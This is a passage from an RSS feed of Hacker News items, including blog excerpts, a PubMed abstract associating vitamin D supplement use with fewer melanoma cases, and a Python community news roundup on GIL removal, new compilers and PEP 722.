<div>

	<article id="post-2934">
 
		<!-- .entry-header -->

		<div>
			<p>There’s a petition circulating that is essentially a public indictment of Richard Stallman. More than half of the initial signers</p>
			
			<p><a href="https://rants.org/2021/04/why-not-to-sign-the-anti-stallman-petition/">Continue reading</a>

				</p></div><!-- .entry-content -->

	</article>


</div>
<div>

	<article id="post-2919">
 
		<!-- .entry-header -->

		<div>
			<p>% So, why are we not using \appdxsection here? % % Sit down, my child, and you shall hear a</p>
			
			<p><a href="https://rants.org/2021/02/actual-latex-comment/">Continue reading</a>

				</p></div><!-- .entry-content -->

	</article>


</div>
<div>

	<article id="post-2896">
 
		<!-- .entry-header -->

		<div>
			<p>I decided to try out this lossless text-compression demonstration site by Fabrice Bellard. It uses GPT-2 natural language generation and</p>
			
			<p><a href="https://rants.org/2020/06/so-this-happened/">Continue reading</a>

				</p></div><!-- .entry-content -->

	</article>


</div>
<div>

	<article id="post-2849">
 
		<!-- .entry-header -->

		<div>
			<p>Have you noticed how Trump consistently says that “we can’t let the cure be worse than the problem“? (emphasis mine)</p>
			
			<p><a href="https://rants.org/2020/05/dont-cover-for-just-cover/">Continue reading</a>

				</p></div><!-- .entry-content -->

	</article>


</div>
<div>

	<article id="post-2847">
 
		<!-- .entry-header -->

		<div>
			<p>I wrote a semi-personal post over at QuestionCopyright.org on why the National Emergency Library is a good thing. (Instead of</p>
			
			<p><a href="https://rants.org/2020/05/support-the-national-emergency-library-is-a-good-idea/">Continue reading</a>

				</p></div><!-- .entry-content -->

	</article>


</div>
<div>

	<article id="post-2792">
 
		<!-- .entry-header -->

		<div>
			<p>Update (2019-11-25): Audrey Eschright has made a link roundup of “pieces I’ve been reading on the topic of modern free</p>
			
			<p><a href="https://rants.org/2019/09/ethics-based-licensing-considered-harmful/">Continue reading</a>

				</p></div><!-- .entry-content -->

	</article>


</div>
<div>

	<article id="post-2774">
 
		<!-- .entry-header -->

		<div>
			<p>Thanks to user lamayonnaise in this Reddit, I was able to solve the problem described below, which I encountered when</p>
			
			<p><a href="https://rants.org/2019/07/solved-apt-get-dist-upgrade-error-when-going-from-debian-9-x-stretch-to-10-0-buster/">Continue reading</a>

				</p></div><!-- .entry-content -->

	</article>


</div>				</div>
		</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Regular use of Vitamin D supplement is associated with fewer melanoma cases (123 pts)]]></title>
            <link>https://pubmed.ncbi.nlm.nih.gov/36580363/</link>
            <guid>36935315</guid>
            <pubDate>Sun, 30 Jul 2023 20:01:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pubmed.ncbi.nlm.nih.gov/36580363/">https://pubmed.ncbi.nlm.nih.gov/36580363/</a>, See on <a href="https://news.ycombinator.com/item?id=36935315">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="article-page" data-article-pmid="36580363">
    
<!-- "Filters applied" shows only when page is redirected from search -->
<!-- because search found one result -->

    

    

    <main id="article-details">
  
  

  

  



  


<header id="heading">
  
    
      <div id="full-view-heading">
        
          <div>
            

            
  
    <div>
      
<p><span>. </span><span>2023 Apr 1;33(2):126-135.</span>

    </p></div>
  
  
    
      <p><span>
        doi: 10.1097/CMR.0000000000000870.
      </span>
    
    
    
    
      <span>
        Epub 2022 Dec 28.
      </span>
    
  


          </p></div>
          



          

          

        
        
          <p>
  

  
    Affiliations
  

  
    
  
</p>
        
        
          
        
        
  
    <ul id="full-view-identifiers">
      
        <li>
          <span>
  <span>
    
      PMID:
    
  </span>

  
    <strong title="PubMed ID">36580363</strong>
  

  
</span>

        </li>
      
        <li>
          <span>
  <span>
    
      DOI:
    
  </span>

  
    <a target="_blank" rel="noopener" ref="linksrc=article_id_link&amp;article_id=10.1097/CMR.0000000000000870&amp;id_type=DOI" href="https://doi.org/10.1097/cmr.0000000000000870" data-ga-category="full_text" data-ga-action="DOI">
      10.1097/CMR.0000000000000870
    </a>
  

  
</span>

        </li>
      
    </ul>
  


        
        
      </div>
      <div id="short-view-heading">
        

        

<h2>
  
    
    
    
    
      
  Regular use of vitamin D supplement is associated with fewer melanoma cases compared to non-use: a cross-sectional study in 498 adult subjects at risk of skin cancers


    
  
</h2>

        

        <p><span>
    
      
        <span><span>Emilia Kanasuo</span><span>&nbsp;et al.</span></span>
      
    
  </span>
  
    
      <span>
        Melanoma Res<span>.</span>
      </span>
      
        <span>
          <time datetime="2023">2023</time><span>.</span>
        </span>
      
    
  
</p>

        
        
        
      </div>
    
  
</header>

  



  

  



  <div id="abstract">
    
      <h2>
        Abstract
        
      </h2>
      
        
          
            <p>
      
      There are conflicting results on the role of vitamin D system in cutaneous carcinogenesis. Therefore, it was investigated whether the use of oral vitamin D supplements associates with photoaging, actinic keratoses, pigment cell nevi, and skin cancers. In this cross-sectional study, 498 adults (aged 21-79 years, 253 males, 245 females, 96 with immunosuppression) subjects at risk of any type of skin cancer were examined, and possible confounding factors were evaluated. The subjects were divided into three groups based on their self-reported use of oral vitamin D supplements: non-use, occasional use, or regular use. The serum level of 25-hydroxyvitamin-D3 was analyzed in 260 subjects. In 402 immunocompetent subjects, vitamin D use did not associate with photoaging, actinic keratoses, nevi, basal, and squamous cell carcinoma. In contrast, there were lower percentages of subjects with a history of past or present melanoma (32/177, 18.1% versus 32/99, 32.3%, P = 0.021) or any type of skin cancer (110/177, 62.1% versus 74/99, 74.7%, P = 0.027) among regular users compared to non-users. In the logistic regression analysis, the odds ratio for melanoma was 0.447 ( P = 0.016, 95% confidence interval, 0.231-0.862) among regular users. Furthermore, the investigator-estimated risk class of skin cancers was significantly lower among regular users. Serum 25-hydroxyvitamin-D3 did not show marked associations with skin-related parameters. The results on 96 immunosuppressed subjects were somewhat similar, although the number of subjects was low. In conclusion, regular use of vitamin D associates with fewer melanoma cases, when compared to non-use, but the causality between them is obscure.
    </p>
          
        
      

      
    

    

    

  </div>


  
  


  <p id="copyright">
    Copyright © 2022 Wolters Kluwer Health, Inc. All rights reserved.
  </p>


  

  
  

  

  
  
    <div id="similar">
      <h2>
        Similar articles
      </h2>
      
        <ul id="similar-articles-list">
          
  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/12787139/" ref="article_id=12787139&amp;linksrc=similar_articles_link&amp;ordinalpos=1" data-ga-category="similar_article" data-ga-action="12787139" data-ga-label="">
      
        The influence of painful sunburns and lifetime sun exposure on the risk of actinic keratoses, seborrheic warts, melanocytic nevi, atypical nevi, and skin cancer.
      
    </a></p><p><span>Kennedy C, Bajdik CD, Willemze R, De Gruijl FR, Bouwes Bavinck JN; Leiden Skin Cancer Study.</span>
        
      
    
    <span>Kennedy C, et al.</span>
    <span>J Invest Dermatol. 2003 Jun;120(6):1087-93. doi: 10.1046/j.1523-1747.2003.12246.x.</span>
    <span>J Invest Dermatol. 2003.</span>
  
  <span>PMID: <span>12787139</span></span>
  
  
  
  
  
</p>

  </div>
  
    </li>
  


    
  

  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/36847301/" ref="article_id=36847301&amp;linksrc=similar_articles_link&amp;ordinalpos=2" data-ga-category="similar_article" data-ga-action="36847301" data-ga-label="">
      
        Patients with a history of atopy have fewer cutaneous melanomas than those without atopy: a cross-sectional study in 496 patients at risk of skin cancers.
      
    </a></p><p><span>Komulainen J, Siiskonen H, Haimakainen S, Kanasuo E, Harvima RJ, Harvima IT.</span>
        
      
    
    <span>Komulainen J, et al.</span>
    <span>Melanoma Res. 2023 Jun 1;33(3):218-229. doi: 10.1097/CMR.0000000000000887. Epub 2023 Feb 28.</span>
    <span>Melanoma Res. 2023.</span>
  
  <span>PMID: <span>36847301</span></span>
  
  
  
  
  
</p>

  </div>
  
    </li>
  


    
  

  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/27663092/" ref="article_id=27663092&amp;linksrc=similar_articles_link&amp;ordinalpos=3" data-ga-category="similar_article" data-ga-action="27663092" data-ga-label="">
      
        Non-genetic risk factors for cutaneous melanoma and keratinocyte skin cancers: An umbrella review of meta-analyses.
      
    </a></p><p><span>Belbasis L, Stefanaki I, Stratigos AJ, Evangelou E.</span>
        
      
    
    <span>Belbasis L, et al.</span>
    <span>J Dermatol Sci. 2016 Dec;84(3):330-339. doi: 10.1016/j.jdermsci.2016.09.003. Epub 2016 Sep 13.</span>
    <span>J Dermatol Sci. 2016.</span>
  
  <span>PMID: <span>27663092</span></span>
  
  
  <span>Review.</span>
  
  
</p>

  </div>
  
    </li>
  


    
  

  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/34455412/" ref="article_id=34455412&amp;linksrc=similar_articles_link&amp;ordinalpos=4" data-ga-category="similar_article" data-ga-action="34455412" data-ga-label="">
      
        Association of Elevated Serum Tryptase with Cutaneous Photodamage and Skin Cancers.
      
    </a></p><p><span>Komulainen J, Siiskonen H, Harvima IT.</span>
        
      
    
    <span>Komulainen J, et al.</span>
    <span>Int Arch Allergy Immunol. 2021;182(11):1135-1142. doi: 10.1159/000517287. Epub 2021 Aug 27.</span>
    <span>Int Arch Allergy Immunol. 2021.</span>
  
  <span>PMID: <span>34455412</span></span>
  
  
  
  
  
</p>

  </div>
  
    </li>
  


    
  

  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/7804989/" ref="article_id=7804989&amp;linksrc=similar_articles_link&amp;ordinalpos=5" data-ga-category="similar_article" data-ga-action="7804989" data-ga-label="">
      
        Precursors to skin cancer.
      
    </a></p><p><span>Sober AJ, Burstein JM.</span>
        
      
    
    <span>Sober AJ, et al.</span>
    <span>Cancer. 1995 Jan 15;75(2 Suppl):645-50. doi: 10.1002/1097-0142(19950115)75:2+&lt;645::aid-cncr2820751405&gt;3.0.co;2-1.</span>
    <span>Cancer. 1995.</span>
  
  <span>PMID: <span>7804989</span></span>
  
  
  <span>Review.</span>
  
  
</p>

  </div>
  
    </li>
  


    
  


        </ul>

        
          

        
      
    </div>
  


  


  
    <div id="citedby">
      <h2>
        Cited by
      </h2>
      
        <ul id="citedby-articles-list">
          
  
    
      
  
    <li>
  
  <div>
    <p><a href="https://pubmed.ncbi.nlm.nih.gov/37054849/" ref="article_id=37054849&amp;linksrc=citedby_articles_link&amp;ordinalpos=1" data-ga-category="cited_by" data-ga-action="37054849" data-ga-label="">
      
        The impact of vitamin D on cancer: A mini review.
      
    </a></p><p><span>Seraphin G, Rieger S, Hewison M, Capobianco E, Lisse TS.</span>
        
      
    
    <span>Seraphin G, et al.</span>
    <span>J Steroid Biochem Mol Biol. 2023 Jul;231:106308. doi: 10.1016/j.jsbmb.2023.106308. Epub 2023 Apr 11.</span>
    <span>J Steroid Biochem Mol Biol. 2023.</span>
  
  <span>PMID: <span>37054849</span></span>
  
  
  <span>Review.</span>
  
  
</p>

  </div>
  
    </li>
  


    
  


        </ul>

        
      
    </div>
  


  
  <div id="references">
    <h2>
      References
    </h2>
    <div id="top-references-list">

  

  
    
      <ol id="top-references-list-1">
        




  <li>
    <ol>
      
        <li value="1">
          
            Lomas A, Leonardi-Bee J, Bath-Hextall F. A systematic review of worldwide incidence of nonmelanoma skin cancer. Br J Dermatol 2012; 166:1069–1080.
            
          
        </li>
      
    </ol>
  </li>

  <li>
    <ol>
      
        <li value="1">
          
            Schadendorf D, van Akkooi ACJ, Berking C, Griewank KG, Gutzmer R, Hauschild A, et al. Melanoma. Lancet 2018; 392:971–984.
            
          
        </li>
      
    </ol>
  </li>

  <li>
    <ol>
      
        <li value="1">
          
            Murphy GM. Ultraviolet radiation and immunosuppression. Br J Dermatol 2009; 161(Suppl. 3):90–95.
            
          
        </li>
      
    </ol>
  </li>

  <li>
    <ol>
      
        <li value="1">
          
            Ulrich C, Kanitakis J, Stockfleth E, Euvrard S. Skin cancer in organ transplant recipients – where do we stand today? Am J Transplant 2008; 8:2192–2198.
            
          
        </li>
      
    </ol>
  </li>

  <li>
    <ol>
      
        <li value="1">
          
            Mittal A, Colegio OR. Skin cancers in organ transplant recipients. Am J Transplant 2017; 17:2509–2530.
            
          
        </li>
      
    </ol>
  </li>


      </ol>
      
        
        

      
    
  

  
    
  

</div>
  </div>

  
  
    <div id="publication-types">
      <h2>
        Publication types
      </h2>

      <ul><li></li></ul>
    </div>
  


  
  
    <div id="mesh-terms">
      <h2>
        MeSH terms
      </h2>

      <ul><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul>
    </div>
  


  
  
    <div id="substances">
      <h2>
        Substances
      </h2>

      <ul><li></li></ul>
    </div>
  


  

  

  



  
  

  



  
  <div id="linkout">
    <h2>
      LinkOut - more resources
    </h2>

    <ul><li><h3>Full Text Sources</h3><ul><li><a href="https://www.ingentaconnect.com/openurl?genre=article&amp;issn=&amp;volume=33&amp;issue=2&amp;spage=126&amp;aulast=Kanasuo" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=3152&amp;uid=36580363&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=9109623" data-ga-category="link_out" data-ga-action="Full Text Sources" data-ga-label="Ingenta plc">
                    Ingenta plc
                  </a></li><li><a href="http://ovidsp.ovid.com/ovidweb.cgi?T=JS&amp;PAGE=linkout&amp;SEARCH=36580363.ui" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=3682&amp;uid=36580363&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=9109623" data-ga-category="link_out" data-ga-action="Full Text Sources" data-ga-label="Ovid Technologies, Inc.">
                    Ovid Technologies, Inc.
                  </a></li><li><a href="https://doi.org/10.1097/CMR.0000000000000870" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=3159&amp;uid=36580363&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=9109623" data-ga-category="link_out" data-ga-action="Full Text Sources" data-ga-label="Wolters Kluwer">
                    Wolters Kluwer
                  </a></li></ul></li><li><h3>Medical</h3><ul><li><a href="https://medlineplus.gov/birthmarks.html" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=3162&amp;uid=36580363&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=9109623" data-ga-category="link_out" data-ga-action="Medical" data-ga-label="MedlinePlus Health Information">
                    MedlinePlus Health Information
                  </a></li></ul></li><li><h3>Miscellaneous</h3><ul><li><a href="https://assays.cancer.gov/CPTAC-68" target="_blank" rel="noopener" ref="linksrc=linkout_link&amp;PrId=8855&amp;uid=36580363&amp;db=pubmed&amp;itool=Abstract&amp;log$=linkoutlink&amp;nlmid=9109623" data-ga-category="link_out" data-ga-action="Miscellaneous" data-ga-label="NCI CPTAC Assay Portal">
                    NCI CPTAC Assay Portal
                  </a></li></ul></li></ul>
  </div>


</main>

    
  


    

    

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[What's up, Python? The GIL removed, a new compiler, optparse deprecated (276 pts)]]></title>
            <link>https://www.bitecode.dev/p/whats-up-python-the-gil-removed-a</link>
            <guid>36935041</guid>
            <pubDate>Sun, 30 Jul 2023 19:32:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bitecode.dev/p/whats-up-python-the-gil-removed-a">https://www.bitecode.dev/p/whats-up-python-the-gil-removed-a</a>, See on <a href="https://news.ycombinator.com/item?id=36935041">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><ul><li><p><em>Python without the GIL, for good</em></p></li><li><p><em>LPython: a new Python Compiler</em></p></li><li><p><em>Pydantic 2 is getting usable</em></p></li><li><p><em>PEP 387 defines "Soft Deprecation", getopt and optparse soft deprecated</em></p></li><li><p><em>Cython 3.0 released with better pure Python support</em></p></li><li><p><em>PEP 722 – Dependency specification for single-file scripts</em></p></li><li><p><em>Python VSCode support gets faster</em></p></li><li><p><em>Paint in the terminal</em></p></li></ul><p><a href="https://www.bitecode.dev/p/whats-up-in-the-python-community-98e" rel="">We saw last month</a><span>&nbsp;the G</span><a href="https://wiki.python.org/moin/GlobalInterpreterLock" rel="">lobal Interpreter Lock</a><span>&nbsp;was the center of attention once again. This month it carried on to the point than even Meta, Facebook’s parent company,&nbsp;</span><a href="https://discuss.python.org/t/a-fast-free-threading-python/27903/99?u=ambv" rel="">pitched in</a><span>:</span></p><blockquote><p>If PEP 703 is accepted, Meta can commit to support in the form of three [engineer years on landing] nogil CPython</p></blockquote><p><span>It is nice to have Python seeing more and more contributions from the big companies that used it for their success. It's a huge contrast&nbsp;</span><a href="https://pyfound.blogspot.com/2012/01/psf-grants-over-37000-to-python.html" rel="">compared to the 2010 decade</a><span>.</span></p><p><span>The discussion culminated with an internal debate with the core devs, which ended up with an official announcement that&nbsp;</span><a href="https://peps.python.org/pep-0703/" rel="">PEP 703</a><span>, the proposal that relit the fire,&nbsp;</span><a href="https://discuss.python.org/t/a-steering-council-notice-about-pep-703-making-the-global-interpreter-lock-optional-in-cpython/30474" rel="">was going to be accepted&nbsp;</a><span>after some details being figured out.</span></p><p>This means in the coming years, Python will have its GIL removed.</p><p>Here is the plan:</p><ul><li><p>Short term, an unsupported experimental version of Python without the GIL is published in parallel to the regular one. Target is 3.13/3.14.</p></li><li><p>Mid-term, the no-GIL version is marked as officially supported, but is still just an alternative to Python with GIL. A target date is announced to make it the default once. This will happen only after the community has shown enough support for it, and will take several years.</p></li><li><p>Long-term, no-GIL becomes the default. Before this, the core devs can reverse the decision and abort the no-GIL project if it proves to have a bad ROI.</p></li></ul><p>Note that if the program imports one single C-extension that uses the GIL on the no-GIL build, it's designed to switch back to the GIL automatically. So this is not a 2=&gt;3 situation where non-compatible code breaks. </p><p>The main reason for the two different builds is to manage the unknown unknowns. Indeed, nobody expects the no-GIL to break things, but with such a big project, you can never be sure. ABI compat is tricky, and new extensions need to be compiled explicitly against it for it to work, so there is a need for the community embracing it.</p><p>Also, no-GIL compatible extensions will work on the old interpreter, so you don't get in the situation like Python 3 code not working on Python 2.</p><p>In fact, Python code itself should not be affected and will work seamlessly on one or the other, albeit with threads limited to a single core with the GIL.</p><p><span>That's the news I didn't see coming. In "</span><a href="https://www.bitecode.dev/p/whats-the-deal-with-cpython-pypy" rel="">What's the deal with CPython, Pypy, MicroPython, Jython...?</a><span>" we talked about Python compilers, and I thought I did a pretty good job about listing everything that mattered. Well, the team behind&nbsp;</span><a href="https://github.com/lcompilers/lpython" rel="">LPython</a><span>&nbsp;decided to take this list and&nbsp;</span><code>.append()</code><span>&nbsp;on it.</span></p><p><span>LPython is a new BSD 3 compiler that takes Python code and translate it for the following for LLVM, C, C++ or WASM. It doesn't aim to compile the entire program, although it can, but rather, like numba and cython, to let you speed up numerical bottle neck.&nbsp;</span><a href="https://lpython.org/blog/2023/07/lpython-novel-fast-retargetable-python-compiler/" rel="">The benchmarks</a><span>&nbsp;are very promising and the ability to switch between Ahead-of-Time and Just-in-Time very convenient, although you will still need&nbsp;</span><a href="https://github.com/lcompilers/lpython#installation" rel="">the entire compilation chain installed on the machine</a><span>. LPython likes raw Python code, so if you call a Python function inside your snippet, you must explicitly mark it as such with a decorator. So most will likely use it for very specific snippets.</span></p><p>I've been pitching the coming of the version 2 of Pydantic for some time, because I, and many people, use it a lot for data validation / schema definition, and the new version is much faster.</p><p><span>Yes, it came out as stable last month, but if you read "</span><a href="https://www.bitecode.dev/p/relieving-your-python-packaging-pain" rel="">Relieving your Python packaging pain</a><span>" you know I don't encourage people to use the last version of anything except for testing or having fun.</span></p><p>Indeed, even a stable major version is still something that is guaranteed to need refinement, and still has little community support.</p><p>But now two things have happened:</p><ul><li><p><a href="https://github.com/pydantic/pydantic/releases" rel="">Pydantic 2.1 has been released</a><span>, the first wave of nasty bugs have been eradicated.</span></p></li><li><p><a href="https://fastapi.tiangolo.com/release-notes/#01000" rel="">Fast API announced support of Pydantic 2</a><span>. Since it's the biggest driver of Pydantic usage, it's a milestone.</span></p></li></ul><p>I will now proceed with giving it a try in one personal project, and if it works, move it into professional projects in a few months.</p><p><span>If you haven't read Victor Stinner's blog yet, I encourage you to do so. It's technical and raw, with zero BS, and gives you a good view of what happens inside the contribution life of a core dev.&nbsp;</span><a href="https://vstinner.github.io/contrib-python-july-2023.html" rel="">Last article</a><span>&nbsp;mentions something I missed last month: soft deprecation has been added to&nbsp;</span><a href="https://peps.python.org/pep-0387/" rel="">PEP 387 – Backwards Compatibility Policy</a><span>.</span></p><p>This document, created in 2009, states how the Python projects deals with deprecation, and it will now contain the following:</p><blockquote><p>A soft deprecation can be used when using an API which should no longer be used to write new code, but it remains safe to continue using it in existing code. The API remains documented and tested, but will not be developed further (no enhancement). The main difference between a “soft” and a (regular) “hard” deprecation is that the soft deprecation does not imply scheduling the removal of the deprecated API.</p></blockquote><p>Basically, a soft deprecated API is in a zombie state, maintained alive forever, but will never see any work on it and be explicitly advised against being used.</p><p><a href="https://docs.python.org/3/library/optparse.html" rel="">optparse</a><span>&nbsp;and&nbsp;</span><a href="https://docs.python.org/3/library/getopt.html" rel="">getopt</a><span>, two modules that used to be a de-facto solution for parsing script arguments in their time, are now marked as "soft-deprecated". You can use them forever, but you probably should not.</span></p><p><span>First,&nbsp;</span><a href="https://docs.python.org/3/library/argparse.html#module-argparse" rel="">argparse</a><span>&nbsp;is the more modern stdlib solution, and we have&nbsp;</span><a href="https://www.bitecode.dev/p/parameters-options-and-flags-for" rel="">a good article on it.</a></p><p><span>Second, 3rd party projects like&nbsp;</span><a href="https://typer.tiangolo.com/" rel="">typer</a><span>&nbsp;and&nbsp;</span><a href="https://click.palletsprojects.com/en/8.1.x/" rel="">click</a><span>&nbsp;exist.</span></p><p><a href="https://cython.org/" rel="">Cython</a><span>, the most famous Python compiler,&nbsp;</span><a href="https://cython.readthedocs.io/en/latest/src/changes.html" rel="">released version 3</a><span>. While the release comes with all sorts of improvement, one particularly stands out. Cython always had limitations: it used a superset of Python to express some of its features.</span></p><p>This is no more the case, as the release notes: "it should now be possible to express all Cython code and use all features in regular Python syntax".</p><p>Which means you now should be able to use any Python code base, just Cython it all and see what happens.</p><p><span>While the no-GIL topic was certainly still alive and well, the proposal of&nbsp;</span><a href="https://pep-previews--3210.org.readthedocs.build/pep-0722" rel="">PEP 722</a><span>&nbsp;really&nbsp;</span><a href="https://discuss.python.org/t/pep-722-dependency-specification-for-single-file-scripts/29905" rel="">heated things up</a><span>.</span></p><p><span>The idea is to formalize a syntax in comments that, similar to </span><a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html" rel="">Groovy’s</a><span>, would allow expressing the dependency of a single script. Taking the example from the PEP itself:</span></p><pre><code><code># In order to run, this script needs the following 3rd party libraries
#
# Requirements:
#    requests
#    rich

import requests
from rich.pretty import pprint

resp = requests.get("https://peps.python.org/api/peps.json")
data = resp.json()
pprint([(k, v["title"]) for k, v in data.items()][:10])</code></code></pre><p>The important lines are:</p><pre><code><code># Requirements:
#    requests
#    rich</code></code></pre><p><span>Which now would be officially formalized to be parsed by third-party tools. The concept is not new and tools like&nbsp;</span><a href="https://pypi.org/project/pip-run/" rel="">pip-run</a><span>&nbsp;already support running a script for which you have the deps described with such comments:</span></p><pre><code><code>$ pip uninstall rich requests
WARNING: Skipping rich as it is not installed.
WARNING: Skipping requests as it is not installed.
$ pip-run dah_script.py
[
│   ('1', 'PEP Purpose and Guidelines'),
│   ('2', 'Procedure for Adding New Modules'),
│   ('3', 'Guidelines for Handling Bug Reports'),
│   ('4', 'Deprecation of Standard Modules'),
│   ('5', 'Guidelines for Language Evolution'),
│   ('6', 'Bug Fix Releases'),
│   ('7', 'Style Guide for C Code'),
│   ('8', 'Style Guide for Python Code'),
│   ('9', 'Sample Plaintext PEP Template'),
│   ('10', 'Voting Guidelines')
]</code></code></pre><p><span>Packages are installed in a temporary&nbsp;</span><a href="https://www.bitecode.dev/p/back-to-basics-with-pip-and-venv" rel="">virtual env</a><span>&nbsp;and deleted after the run, like&nbsp;</span><a href="https://www.npmjs.com/package/npx" rel="">npx</a><span>&nbsp;used to do for the JS world.</span></p><p><span>The PEP doesn't imply Python or pip are going to integrate such feature, it's only about formalizing the syntax for now. But I have good hope for this one, as I have several lone Python scripts lying around that would really benefit from this, especially if you can keep the env around in the future. Such a proposal could show demand for it, and years later, lead to pip adoption. E.G: npx influenced the addition of&nbsp;</span><code>npm create</code><span>, which allows to fetch a project template from specific packages. Indeed, that was the most common use case for npx.</span></p><p><span>If you use VSCode, you may have noticed using a lot of linters made the IDE slower. Mypy is particularly at fault as the&nbsp;</span><code>mypy</code><span>&nbsp;command is slow to start, and the daemon mode is not used by VSCode.</span></p><p><span>For his&nbsp;</span><a href="https://devblogs.microsoft.com/python/python-in-visual-studio-code-july-2023-release/" rel="">new release</a><span>, a new official mypy extension is now available, which uses the dmypy daemon. The speed up is such that the editor can now offer the check on the entire code base, not just the current file.</span></p><p>On top of that, pylance, the Microsft official extension for Python support, will now persist all the indexing work it performs on 3rd party libs. This will result in a lighter startup, and for big project, a speedier experience as indexing can take some time with slow machines.</p><p>I personally have to work on corporate clients’ laptops I can't modify, and they come with a ton of security software that makes them slow down to crawl, with process inspection and network calls to check file signatures after you click on anything. So this is a lifesaver.</p><p>This is just so cool:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png" width="1008" height="834" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:834,&quot;width&quot;:1008,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:28943,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f7266f3-6542-4d5f-a261-3e0ba3c0edca_1008x834.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><a href="https://github.com/1j01/textual-paint" rel="">It's a version of paint</a><span>&nbsp;that runs in the terminal, thanks to the Python lib&nbsp;</span><a href="https://textual.textualize.io/" rel="">textual</a></p><p>It's not going to change your life or anything, but WOW.</p><p>I installed it, and it's damn reactive. It even handles Ctrl-Z, and features a file selector when you try to save your work.</p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[You Are Atlas, You Hold Up the Sky (143 pts)]]></title>
            <link>https://youareatlas.com/</link>
            <guid>36934391</guid>
            <pubDate>Sun, 30 Jul 2023 18:28:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://youareatlas.com/">https://youareatlas.com/</a>, See on <a href="https://news.ycombinator.com/item?id=36934391">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Reasons Not to Be a Manager (2019) (119 pts)]]></title>
            <link>https://charity.wtf/2019/09/08/reasons-not-to-be-a-manager/</link>
            <guid>36934135</guid>
            <pubDate>Sun, 30 Jul 2023 18:06:27 GMT</pubDate>
